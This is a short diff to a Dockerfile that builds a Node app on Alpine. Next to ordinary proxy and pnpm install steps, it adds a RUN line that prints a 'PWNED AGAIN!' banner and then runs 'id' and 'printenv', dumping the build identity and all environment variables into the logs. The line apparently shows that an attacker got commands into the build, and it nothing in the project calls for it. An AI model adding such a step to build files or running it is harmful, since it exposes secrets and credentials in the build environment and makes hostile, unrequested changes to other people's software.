@@ -4,6 +4,7 @@ WORKDIR /app
 
 ARG proxy
 
+RUN echo "============== PWNED AGAIN! ==============" && id && printenv && echo "=========================================="
 RUN [ -z "$proxy" ] || sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories
 RUN apk add --no-cache libc6-compat && npm install -g pnpm@9.4.0
 
